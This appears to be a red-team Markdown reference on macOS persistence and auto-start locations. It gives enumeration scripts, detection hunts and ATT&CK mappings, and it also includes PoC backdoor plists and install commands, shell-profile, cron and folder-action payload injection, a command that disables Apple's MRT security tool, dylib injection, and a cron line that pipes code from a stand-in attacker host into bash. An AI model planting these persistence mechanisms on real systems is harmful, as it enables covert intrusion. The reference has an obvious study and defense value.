# 🍎 macOS Auto Start Locations — Persistence

> A complete Red Team reference for **macOS persistence mechanisms** and auto-start locations. Covers LaunchAgents, LaunchDaemons, Login Items, cron, periodic scripts, shell profiles, login/logout hooks, startup items, folder actions, XPC services, and sandbox bypass techniques — with enumeration commands, PoC plist templates, detection methods, and MITRE ATT&CK mappings.

<p align="center">
  <img src="https://img.shields.io/badge/macOS-13%2B-black?style=for-the-badge&logo=apple&logoColor=white"/>
  <img src="https://img.shields.io/badge/MITRE-T1543%20%7C%20T1547%20%7C%20T1053-red?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Privilege-User%20%7C%20Root-orange?style=for-the-badge"/>
</p>

---

## Table of Contents

- [Overview](#overview)
- [SIP & Privilege Requirements](#sip--privilege-requirements)
- [Technique 1 — LaunchAgents](#technique-1--launchagents)
- [Technique 2 — LaunchDaemons](#technique-2--launchdaemons)
- [Technique 3 — Login Items](#technique-3--login-items)
- [Technique 4 — Login & Logout Hooks](#technique-4--login--logout-hooks)
- [Technique 5 — Cron Jobs](#technique-5--cron-jobs)
- [Technique 6 — at Jobs](#technique-6--at-jobs)
- [Technique 7 — Periodic Scripts](#technique-7--periodic-scripts)
- [Technique 8 — Shell Profile Files](#technique-8--shell-profile-files)
- [Technique 9 — Startup Items (Legacy)](#technique-9--startup-items-legacy)
- [Technique 10 — Folder Actions](#technique-10--folder-actions)
- [Technique 11 — launchd Overrides](#technique-11--launchd-overrides)
- [Technique 12 — XPC Services](#technique-12--xpc-services)
- [Technique 13 — Kernel Extensions (KEXT)](#technique-13--kernel-extensions-kext)
- [Technique 14 — Dynamic Library Hijacking](#technique-14--dynamic-library-hijacking)
- [Technique 15 — Browser Extensions](#technique-15--browser-extensions)
- [Technique 16 — Application Bundles](#technique-16--application-bundles)
- [Sandbox Bypass via Auto-Start Locations](#sandbox-bypass-via-auto-start-locations)
- [Enumeration — Full Checklist Commands](#enumeration--full-checklist-commands)
- [Detection & Hunting](#detection--hunting)
- [Real-World Malware Examples](#real-world-malware-examples)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Complete Testing Checklist](#complete-testing-checklist)
- [Tools](#tools)
- [References](#references)

---

## Overview

macOS offers numerous **auto-start locations** — mechanisms that automatically execute code on login, boot, or scheduled intervals. Attackers abuse these to establish **persistence** after initial compromise.

### Auto-Start Trigger Summary

```
SYSTEM BOOT
  └── LaunchDaemons        → /Library/LaunchDaemons/
  └── Startup Items        → /Library/StartupItems/ (legacy)
  └── Kernel Extensions    → /Library/Extensions/

USER LOGIN
  └── LaunchAgents         → ~/Library/LaunchAgents/
                           → /Library/LaunchAgents/
  └── Login Items          → System Settings → General → Login Items
  └── Login Hooks          → com.apple.loginwindow.plist
  └── Shell Profiles       → ~/.zshrc, ~/.bash_profile, ~/.zprofile

SCHEDULED / TRIGGERED
  └── Cron Jobs            → crontab -e / /usr/lib/cron/tabs/
  └── at Jobs              → /private/var/at/jobs/
  └── Periodic Scripts     → /etc/periodic/{daily,weekly,monthly}/
  └── Folder Actions       → ~/Library/Scripts/Folder Action Scripts/

PASSIVE / LIBRARY
  └── Dylib Hijacking      → DYLD_INSERT_LIBRARIES, weak-linked dylibs
  └── XPC Services         → App-registered XPC endpoints
  └── Browser Extensions   → ~/Library/Application Support/{Chrome,Safari}/
```

---

## SIP & Privilege Requirements

Since the introduction of System Integrity Protection (SIP) in OS X 10.11 (El Capitan), the `/System/` directories are protected — malware cannot modify them. As such, malware is constrained to creating launch persistence in `/Library/` or `~/Library/` directories.

| Location | SIP Protected | Privilege Needed | Trigger |
|---|---|---|---|
| `/System/Library/LaunchAgents/` | ✅ Yes | N/A (Apple only) | User login |
| `/System/Library/LaunchDaemons/` | ✅ Yes | N/A (Apple only) | Boot |
| `/Library/LaunchAgents/` | ❌ No | Root | User login |
| `/Library/LaunchDaemons/` | ❌ No | Root | Boot |
| `~/Library/LaunchAgents/` | ❌ No | User | User login |
| `~/Library/LaunchDemons/` | ❌ No | User | User login |
| Login Items | ❌ No | User | User login |
| Login Hooks | ❌ No | Root | User login |
| Cron Jobs | ❌ No | User/Root | Scheduled |
| Periodic Scripts | ❌ No | Root | Scheduled |
| Shell Profiles | ❌ No | User | Shell start |

---

## Technique 1 — LaunchAgents

> LaunchAgents are the most common macOS persistence mechanism. When a user logs in, the plists located in `/Users/$USER/Library/LaunchAgents` and `/Users/$USER/Library/LaunchDaemons` are started with the logged user's permissions. Agents are loaded when the user logs in and may use the GUI.

### Locations

```bash
~/Library/LaunchAgents/          # User-level (no root needed)
/Library/LaunchAgents/           # Admin-installed, all users (root needed)
/System/Library/LaunchAgents/    # Apple-provided (SIP protected)
```

### Enumerate All LaunchAgents

```bash
# Current user LaunchAgents
ls -la ~/Library/LaunchAgents/

# System-wide LaunchAgents
ls -la /Library/LaunchAgents/

# Loaded LaunchAgents
launchctl list | grep -v com.apple

# Show details of a specific agent
launchctl list com.example.agent

# Read plist contents
cat ~/Library/LaunchAgents/com.example.agent.plist
plutil -p ~/Library/LaunchAgents/com.example.agent.plist
```

### PoC — Malicious LaunchAgent plist

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.example.backdoor</string>

  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>-c</string>
    <string>/Users/victim/Library/.hidden/payload.sh</string>
  </array>

  <key>RunAtLoad</key>
  <true/>

  <key>KeepAlive</key>
  <true/>

  <key>StandardOutPath</key>
  <string>/tmp/.out</string>

  <key>StandardErrorPath</key>
  <string>/tmp/.err</string>
</dict>
</plist>
```

### Install & Load

```bash
# Place plist in LaunchAgents
cp backdoor.plist ~/Library/LaunchAgents/com.example.backdoor.plist

# Load immediately (no reboot needed)
launchctl load ~/Library/LaunchAgents/com.example.backdoor.plist

# Verify it's loaded
launchctl list | grep backdoor

# Force load (even if disabled)
launchctl load -F ~/Library/LaunchAgents/com.example.backdoor.plist
```

### Remove / Unload

```bash
launchctl unload ~/Library/LaunchAgents/com.example.backdoor.plist
rm ~/Library/LaunchAgents/com.example.backdoor.plist
```

### Key plist Fields for Attackers

| Key | Value | Description |
|---|---|---|
| `RunAtLoad` | `true` | Execute when loaded (login) |
| `KeepAlive` | `true` | Restart if process dies |
| `StartInterval` | `300` | Run every N seconds |
| `StartCalendarInterval` | Dict | Run at specific time (cron-like) |
| `WatchPaths` | Array | Run when file/dir changes |
| `ProgramArguments` | Array | Command + arguments |
| `Program` | String | Path to binary |
| `UserName` | String | Run as specific user |
| `Disabled` | `false` | Must be false to load |

---

## Technique 2 — LaunchDaemons

> LaunchDaemons are loaded at system startup. They run as services like SSH that need to execute before any user accesses the system. Daemons run in the background without GUI access.

### Locations

```bash
/Library/LaunchDaemons/          # Admin-installed (root needed)
/System/Library/LaunchDaemons/   # Apple-provided (SIP protected)
```

### Enumerate

```bash
# List all LaunchDaemons
ls -la /Library/LaunchDaemons/

# List loaded daemons
sudo launchctl list

# Filter for non-Apple daemons
sudo launchctl list | grep -v "com.apple\|PID\|-"

# Check a specific daemon
sudo launchctl list com.example.daemon
plutil -p /Library/LaunchDaemons/com.example.daemon.plist
```

### PoC — System-Level Persistence (Root Required)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.example.daemon</string>

  <key>ProgramArguments</key>
  <array>
    <string>/usr/local/bin/backdoor</string>
  </array>

  <key>RunAtLoad</key>
  <true/>

  <key>KeepAlive</key>
  <true/>

  <key>UserName</key>
  <string>root</string>
</dict>
</plist>
```

```bash
# Install (root required)
sudo cp daemon.plist /Library/LaunchDaemons/com.example.daemon.plist
sudo chown root:wheel /Library/LaunchDaemons/com.example.daemon.plist
sudo chmod 644 /Library/LaunchDaemons/com.example.daemon.plist
sudo launchctl load /Library/LaunchDaemons/com.example.daemon.plist
```

---

## Technique 3 — Login Items

> Login Items are applications, scripts, or files that open automatically when a user logs in.

### Enumerate

```bash
# List all login items via osascript
osascript -e 'tell application "System Events" to get the name of every login item'

# More detailed (name + path)
osascript -e 'tell application "System Events" to get properties of every login item'

# Via sfltool (macOS 13+)
sfltool dumpbtm

# Legacy plist location
cat ~/Library/Preferences/com.apple.loginitems.plist 2>/dev/null
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm 2>/dev/null
```

### Add via osascript (no root needed)

```bash
# Add login item pointing to a script
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/Users/victim/Library/.hidden/payload.app", hidden:true}'

# Remove login item
osascript -e 'tell application "System Events" to delete login item "payload"'
```

### Add via Swift / Objective-C (SMLoginItemSetEnabled)

```swift
import ServiceManagement

// Register a helper app as a login item
SMLoginItemSetEnabled("com.example.helper" as CFString, true)
```

---

## Technique 4 — Login & Logout Hooks

> Login or logout hooks are scripts or commands that run automatically when a user logs in or logs out. They are stored in `~/Library/Preferences/com.apple.loginwindow.plist` as key-value pairs.

### Enumerate

```bash
# Check login/logout hooks
defaults read com.apple.loginwindow LoginHook 2>/dev/null
defaults read com.apple.loginwindow LogoutHook 2>/dev/null

# Direct plist read
sudo defaults read /var/root/Library/Preferences/com.apple.loginwindow.plist 2>/dev/null
```

### Set Login Hook (Root Required)

```bash
# Create a malicious login script
cat > /tmp/login_hook.sh << 'EOF'
#!/bin/bash
/usr/local/bin/backdoor &
EOF
chmod +x /tmp/login_hook.sh

# Register as login hook
sudo defaults write com.apple.loginwindow LoginHook /tmp/login_hook.sh

# Register logout hook
sudo defaults write com.apple.loginwindow LogoutHook /tmp/logout_hook.sh

# Verify
sudo defaults read com.apple.loginwindow
```

### Remove Hook

```bash
sudo defaults delete com.apple.loginwindow LoginHook
sudo defaults delete com.apple.loginwindow LogoutHook
```

---

## Technique 5 — Cron Jobs

> You can see all the cron jobs of users in `/usr/lib/cron/tabs/` and `/var/at/tabs/` (needs root).

### Enumerate

```bash
# Current user crontab
crontab -l

# All user crontabs (root)
sudo ls -la /usr/lib/cron/tabs/
sudo cat /usr/lib/cron/tabs/$(whoami)

# All crontab locations
ls -la /var/at/tabs/
ls -la /usr/lib/cron/tabs/
ls -la /etc/cron.d/ 2>/dev/null

# Check if cron daemon is running
launchctl list | grep cron
sudo launchctl list | grep com.vix.cron
```

### Add Cron Job (User Level)

```bash
# Edit crontab
crontab -e

# Common cron persistence patterns:

# Run every minute
* * * * * /Users/victim/.hidden/payload.sh

# Run at login (via @reboot)
@reboot /Users/victim/.hidden/payload.sh

# Run hourly (common for C2 beaconing — Shlayer used this)
0 * * * * /usr/bin/curl -s http://c2.attacker.com/check | bash

# Run daily
0 8 * * * /tmp/.payload

# Crontab format:
# MIN HOUR DAY MONTH WEEKDAY COMMAND
# *   *    *   *     *       command
```

### Install Crontab from File (No Root Needed)

```bash
echo "* * * * * /tmp/payload.sh" > /tmp/cron_entry
crontab /tmp/cron_entry
crontab -l  # Verify
```

---

## Technique 6 — at Jobs

> `at` tasks are designed for scheduling one-time tasks to be executed at certain times. Unlike cron jobs, at tasks are automatically removed post-execution. These tasks are persistent across system reboots. By default they are disabled but the root user can enable them.

### Enable at Daemon (Root)

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

### Schedule at Job

```bash
# Run in 1 minute
echo "/tmp/payload.sh" | at now + 1 minute

# Run at specific time
echo "/tmp/payload.sh" | at 23:00

# List scheduled jobs
atq

# View job details
at -c JOBNUMBER

# Remove job
atrm JOBNUMBER
```

### Persistent at Jobs Location

```bash
ls -la /private/var/at/jobs/
```

---

## Technique 7 — Periodic Scripts

> Periodic scripts are similar to cron jobs and are generally written on a daily, weekly, or monthly schedule. These scripts are to be dropped into one of the below locations and will execute on the schedule indicated by its parent folder.

### Locations

```bash
/etc/periodic/daily/      # Runs daily
/etc/periodic/weekly/     # Runs weekly
/etc/periodic/monthly/    # Runs monthly
```

### Enumerate

```bash
ls -la /etc/periodic/daily/
ls -la /etc/periodic/weekly/
ls -la /etc/periodic/monthly/

# Check periodic configuration
cat /etc/defaults/periodic.conf
cat /etc/periodic.conf 2>/dev/null

# Manually trigger daily periodic scripts
sudo periodic daily
sudo periodic weekly
sudo periodic monthly
```

### PoC — Malicious Periodic Script

```bash
# Create daily persistent script (root required)
cat > /etc/periodic/daily/999.backdoor << 'EOF'
#!/bin/sh
# Runs daily — disguised as maintenance
if [ -x /usr/local/bin/payload ]; then
    /usr/local/bin/payload &
fi
EOF

chmod 755 /etc/periodic/daily/999.backdoor
```

> **Note:** The `999` prefix ensures the script runs last in the sequence.

---

## Technique 8 — Shell Profile Files

> Another option is to create the files `.bash_profile` and `.zshenv` inside the user HOME. If the folder LaunchAgents already exists, this technique would still work.

### Locations (No Root Needed)

```bash
~/.zshrc              # Zsh interactive shell (default macOS shell)
~/.zprofile           # Zsh login shell
~/.zshenv             # Zsh — loaded for ALL shell types (best for persistence)
~/.bash_profile       # Bash login shell
~/.bashrc             # Bash interactive shell
~/.profile            # POSIX sh — fallback
/etc/zshrc            # System-wide zsh (root)
/etc/profile          # System-wide profile (root)
/etc/paths            # PATH additions
/etc/environment      # Environment variables
```

### Enumerate

```bash
# Check all shell profile files
cat ~/.zshrc 2>/dev/null
cat ~/.zprofile 2>/dev/null
cat ~/.zshenv 2>/dev/null
cat ~/.bash_profile 2>/dev/null
cat ~/.bashrc 2>/dev/null
cat ~/.profile 2>/dev/null
cat /etc/zshrc 2>/dev/null
cat /etc/profile 2>/dev/null
```

### Persistence via Shell Profile

```bash
# Append payload to .zshenv (loaded for ALL Zsh shells)
echo '/tmp/.backdoor &' >> ~/.zshenv

# Append to .zshrc (interactive shells)
echo 'nohup /usr/local/bin/payload > /dev/null 2>&1 &' >> ~/.zshrc

# Source a separate file (harder to notice)
echo 'source ~/.config/.init.sh' >> ~/.zshrc
cat > ~/.config/.init.sh << 'EOF'
#!/bin/bash
/tmp/payload &
EOF
chmod +x ~/.config/.init.sh
```

---

## Technique 9 — Startup Items (Legacy)

> Startup Items (`/Library/StartupItems/`) were the macOS boot persistence mechanism before launchd — deprecated since OS X 10.4 Tiger but still parsed on some systems.

### Location

```bash
/Library/StartupItems/
/System/Library/StartupItems/  # Apple items (SIP protected)
```

### Structure

```
/Library/StartupItems/
  └── MyBackdoor/
      ├── MyBackdoor          # Executable shell script
      └── StartupParameters.plist  # Metadata
```

### Enumerate

```bash
ls -la /Library/StartupItems/ 2>/dev/null
ls -la /System/Library/StartupItems/ 2>/dev/null
```

---

## Technique 10 — Folder Actions

> Folder Actions are AppleScript scripts attached to folders that execute when items are added, removed, or modified in that folder.

### Enumerate

```bash
# List folder action scripts
ls -la ~/Library/Scripts/Folder\ Action\ Scripts/ 2>/dev/null

# Check via System Events
osascript -e 'tell application "System Events" to get every folder action'

# Check folder action settings
defaults read com.apple.FolderActionsDispatcher 2>/dev/null
```

### PoC — Malicious Folder Action

```applescript
-- Save as: ~/Library/Scripts/Folder Action Scripts/backdoor.scpt
on adding folder items to this_folder after receiving these_items
    do shell script "/tmp/payload.sh &"
end adding folder items to
```

```bash
# Compile AppleScript
osacompile -o ~/Library/Scripts/Folder\ Action\ Scripts/backdoor.scpt backdoor.applescript

# Attach to a commonly-used folder (e.g., Downloads)
osascript -e 'tell application "System Events" to attach action to POSIX file "/Users/victim/Downloads" using POSIX file "/Users/victim/Library/Scripts/Folder Action Scripts/backdoor.scpt"'

# Enable folder actions
osascript -e 'tell application "System Events" to set folder actions enabled to true'
```

---

## Technique 11 — launchd Overrides

> Overrides are designed to override values within LaunchDaemon or LaunchAgent. If the `Disabled` value on a plist is set to `True` but is then set to `False` in the overrides, it will still load next time the plist would be triggered.

### Location

```bash
/var/db/launchd.db/com.apple.launchd/overrides.plist
```

### Enumerate & Abuse

```bash
# Read overrides
sudo plutil -p /var/db/launchd.db/com.apple.launchd/overrides.plist

# Re-enable a disabled service via override (root required)
sudo launchctl enable system/com.apple.atrun

# Disable a security tool via override
sudo launchctl disable system/com.apple.MRT
```

---

## Technique 12 — XPC Services

> XPC Services are inter-process communication endpoints registered by applications. If an app's XPC service is abused, it can provide persistent code execution.

### Enumerate

```bash
# List all XPC services
ls -la /usr/lib/xpc/launchd.xpc/
ls -la /System/Library/XPCServices/

# Show app-bundled XPC services
find /Applications -name "*.xpc" 2>/dev/null

# List active XPC connections
launchctl list | grep xpc
```

---

## Technique 13 — Kernel Extensions (KEXT)

> Kernel extensions load code into the kernel itself — the most powerful but hardest persistence method.

### Locations

```bash
/Library/Extensions/             # Third-party KEXTs
/System/Library/Extensions/      # Apple KEXTs (SIP protected)
```

### Enumerate

```bash
# List all loaded kernel extensions
kextstat

# List all installed extensions
ls -la /Library/Extensions/

# Check specific KEXT info
kextstat | grep -v com.apple
```

> **Note:** Apple Silicon Macs (M1/M2/M3) require SIP + Secure Boot disabled, plus notarization and user approval to load third-party KEXTs — effectively blocking this technique without physical access.

---

## Technique 14 — Dynamic Library Hijacking

> macOS applications load dylibs at runtime. Attackers can inject malicious dylibs via weak-linked library paths or `DYLD_INSERT_LIBRARIES`.

### Enumerate Weak-Linked Libraries

```bash
# Find weak-linked libraries in a binary
otool -L /Applications/target.app/Contents/MacOS/target | grep weak

# Check RPATH entries
otool -l /path/to/binary | grep -A2 LC_RPATH

# Find missing dylibs (non-existent paths)
find /Applications -name "*.dylib" 2>/dev/null
```

### DYLD_INSERT_LIBRARIES (User Space Injection)

```bash
# Inject a dylib into any non-SIP-protected binary
DYLD_INSERT_LIBRARIES=/tmp/evil.dylib /usr/local/bin/target

# Persist via shell profile
echo 'export DYLD_INSERT_LIBRARIES=/tmp/evil.dylib' >> ~/.zshrc
```

> **Note:** Does NOT work on SIP-protected binaries or hardened runtime apps.

---

## Technique 15 — Browser Extensions

> Malicious Safari or Chrome extensions can run in the background, steal cookies, or intercept traffic.

### Enumerate

```bash
# Chrome extensions
ls -la ~/Library/Application\ Support/Google/Chrome/Default/Extensions/

# Safari extensions
ls -la ~/Library/Safari/Extensions/ 2>/dev/null
pluginkit -m -v -p com.apple.Safari.extension

# Firefox
ls -la ~/Library/Application\ Support/Firefox/Profiles/*/extensions/
```

---

## Technique 16 — Application Bundles

> Modifying existing legitimate application bundles to include a malicious payload.

```bash
# Find third-party apps (non-SIP-protected)
ls /Applications/ | grep -v ".app"

# Inject into Info.plist (add NSPrincipalClass or modify scripts)
plutil -p /Applications/target.app/Contents/Info.plist

# Find and replace binary entrypoints
find /Applications/target.app -name "*.sh" 2>/dev/null
```

---

## Sandbox Bypass via Auto-Start Locations

> Here you can find start locations useful for sandbox bypass that allows you to simply execute something by writing it into a file and waiting for a very common action, a determined amount of time, or an action by the user.

### Technique: Write to Shell Profile (No Privilege)

```bash
# Sandboxed app can write to ~/.zshenv
# Next time user opens Terminal → payload executes

echo '/tmp/payload.sh &' >> ~/.zshenv
```

### Technique: LaunchAgent from Sandbox

```bash
# Some sandboxed apps can write to ~/Library/LaunchAgents/
# This survives sandbox boundary
cp malicious.plist ~/Library/LaunchAgents/com.example.persist.plist
launchctl load ~/Library/LaunchAgents/com.example.persist.plist
```

### Technique: Cron from Sandbox

```bash
# crontab -e may be accessible from sandbox
(crontab -l 2>/dev/null; echo "* * * * * /tmp/payload.sh") | crontab -
```

---

## Enumeration — Full Checklist Commands

```bash
#!/bin/bash
# macOS Persistence Enumeration Script

echo "=== LaunchAgents (User) ==="
ls -la ~/Library/LaunchAgents/ 2>/dev/null

echo "=== LaunchAgents (System) ==="
ls -la /Library/LaunchAgents/ 2>/dev/null

echo "=== LaunchDaemons ==="
sudo ls -la /Library/LaunchDaemons/ 2>/dev/null

echo "=== Loaded Non-Apple Launchd Items ==="
launchctl list | grep -v "com.apple\|PID\|-"

echo "=== Login Items ==="
osascript -e 'tell application "System Events" to get the name of every login item' 2>/dev/null

echo "=== Login Hooks ==="
defaults read com.apple.loginwindow LoginHook 2>/dev/null
defaults read com.apple.loginwindow LogoutHook 2>/dev/null

echo "=== Crontabs ==="
crontab -l 2>/dev/null
sudo ls -la /usr/lib/cron/tabs/ 2>/dev/null
sudo ls -la /var/at/tabs/ 2>/dev/null

echo "=== Periodic Scripts ==="
ls -la /etc/periodic/daily/ /etc/periodic/weekly/ /etc/periodic/monthly/ 2>/dev/null

echo "=== Shell Profiles ==="
for f in ~/.zshrc ~/.zprofile ~/.zshenv ~/.bash_profile ~/.bashrc ~/.profile /etc/zshrc /etc/profile; do
    [ -f "$f" ] && echo "--- $f ---" && grep -v "^#\|^$" "$f"
done

echo "=== Startup Items (Legacy) ==="
ls -la /Library/StartupItems/ 2>/dev/null

echo "=== Kernel Extensions ==="
kextstat | grep -v com.apple

echo "=== Folder Actions ==="
ls -la ~/Library/Scripts/Folder\ Action\ Scripts/ 2>/dev/null

echo "=== Browser Extensions ==="
ls ~/Library/Application\ Support/Google/Chrome/Default/Extensions/ 2>/dev/null

echo "=== launchd Overrides ==="
sudo plutil -p /var/db/launchd.db/com.apple.launchd/overrides.plist 2>/dev/null

echo "=== SIP Status ==="
csrutil status
```

---

## Detection & Hunting

### Check New/Modified plist Files

```bash
# Files modified in last 24 hours in persistence locations
find ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons \
  -name "*.plist" -newer /tmp/baseline -ls 2>/dev/null

# Check modification time of all agent plists
find ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons \
  -name "*.plist" -exec stat -f "%m %N" {} \; | sort -rn | head -20
```

### Validate plist Contents

```bash
# Check all non-Apple LaunchAgent plists
for plist in ~/Library/LaunchAgents/*.plist /Library/LaunchAgents/*.plist; do
    echo "=== $plist ==="
    plutil -p "$plist" 2>/dev/null | grep -E "Program|ProgramArguments|RunAtLoad|KeepAlive"
done
```

### Hunt for Suspicious Patterns

```bash
# Find plists pointing to hidden/tmp directories
grep -r "\/tmp\|\/var\/tmp\|Library\/\." \
  ~/Library/LaunchAgents/ /Library/LaunchAgents/ /Library/LaunchDaemons/ 2>/dev/null

# Find plists with KeepAlive=true (persistent restart)
grep -r "KeepAlive" ~/Library/LaunchAgents/ /Library/LaunchAgents/ 2>/dev/null

# Find cron jobs with common C2 patterns
crontab -l 2>/dev/null | grep -E "curl|wget|bash|python|nc|ncat"

# Check for unsigned binaries in persistence locations
for plist in ~/Library/LaunchAgents/*.plist; do
    binary=$(plutil -p "$plist" 2>/dev/null | grep "0 =>" | awk '{print $3}' | tr -d '"')
    [ -n "$binary" ] && codesign -v "$binary" 2>&1 | grep -v "valid on disk"
done
```

---

## Real-World Malware Examples

| Malware | Technique | Details |
|---|---|---|
| **Shlayer** (2020) | Cron job | Used cron to redownload adware payloads hourly |
| **DazzleSpy** (2022) | Cron job | APT group leveraging cron for C2 beaconing |
| **OceanLotus (APT32)** | Login Items | Hid login items to spy on activists |
| **FruitFly** | Login Items | Used hidden login items for screen recording |
| **Calisto** | LaunchAgent | LaunchAgent + hidden directory for backdoor binary |
| **OSX.Bundlore** | LaunchAgent | LaunchAgent plist with RunAtLoad + KeepAlive |
| **Silver Sparrow** | LaunchAgent | LaunchAgent + periodic verification script |
| **XLoader** | LaunchAgent | User-level LaunchAgent delivering info-stealer |

---

## MITRE ATT&CK Mapping

| Technique | ID | Sub-technique |
|---|---|---|
| Boot/Logon Autostart — LaunchAgent | T1543.001 | Create or Modify System Process: Launch Agent |
| Boot/Logon Autostart — LaunchDaemon | T1543.004 | Create or Modify System Process: Launch Daemon |
| Boot/Logon Autostart — Login Items | T1547.015 | Boot/Logon Autostart Execution: Login Items |
| Scheduled Task/Job — Cron | T1053.003 | Scheduled Task/Job: Cron |
| Scheduled Task/Job — at | T1053.001 | Scheduled Task/Job: At |
| Scheduled Task/Job — Launchd | T1053.004 | Scheduled Task/Job: Launchd |
| Event Triggered — LC_LOAD_DYLIB | T1546.006 | Event Triggered Execution: LC_LOAD_DYLIB Addition |
| Event Triggered — Shell init | T1546.004 | Event Triggered Execution: Unix Shell Configuration |
| Hijack Flow — Dylib | T1574.004 | Hijack Execution Flow: Dylib Hijacking |
| Kernel Modules | T1547.006 | Boot/Logon Autostart: Kernel Modules |

---

## Complete Testing Checklist

### Enumeration
- [ ] All LaunchAgent directories listed and reviewed?
- [ ] All LaunchDaemon directories listed and reviewed?
- [ ] Login Items enumerated via osascript + sfltool?
- [ ] Login/Logout hooks checked in loginwindow.plist?
- [ ] Crontabs checked for all users?
- [ ] Periodic scripts reviewed in /etc/periodic/?
- [ ] Shell profile files reviewed (.zshrc, .zshenv, .profile)?
- [ ] Startup Items checked (/Library/StartupItems/)?
- [ ] Folder Actions listed?
- [ ] launchd Overrides plist reviewed?
- [ ] Browser extensions enumerated?
- [ ] Kernel extensions checked (kextstat)?

### Red Team / Persistence
- [ ] User-level LaunchAgent installed and loaded?
- [ ] System-level LaunchDaemon installed (if root)?
- [ ] Cron job added without root?
- [ ] Shell profile modified for persistence?
- [ ] Login hook configured?
- [ ] Periodic script dropped (if root)?
- [ ] Dylib hijack path identified?

### Detection
- [ ] Modified plists in last 24h identified?
- [ ] Unsigned binaries in persistence locations found?
- [ ] Plists pointing to /tmp or hidden directories flagged?
- [ ] SIP status verified (csrutil status)?
- [ ] KnockKnock scan run?

---

## Tools

| Tool | Purpose |
|---|---|
| **KnockKnock** (Objective-See) | Scan all persistence locations — GUI |
| **BlockBlock** (Objective-See) | Real-time persistence monitoring alerts |
| **LuLu** (Objective-See) | Block unauthorized outbound connections |
| **launchctl** | Built-in — manage launchd services |
| **plutil** | Built-in — read/validate plist files |
| **osascript** | Built-in — AppleScript for login items |
| **sfltool** | Built-in — Background Task Management |
| **kextstat** | Built-in — list kernel extensions |
| **Santa** (Google) | Binary authorization + monitoring |
| **Venator** | macOS threat hunting tool |
| **Crescendo** | Real-time event monitor for macOS |

---

## References

- MITRE ATT&CK — macOS Persistence Techniques
- Patrick Wardle — Objective-See Blog (theevilbit.github.io/beyond)
- Apple Developer — launchd man page
- The Art of Mac Malware — Vol. 1 (Patrick Wardle)
- Huntress — Insistence on Persistence
- 100 Days of Red Team — macOS Persistence Primer
- SentinelOne — How Malware Persists on macOS
- Cocomelonc — macOS Malware Persistence Series
- CVE Database — macOS KEXT vulnerabilities
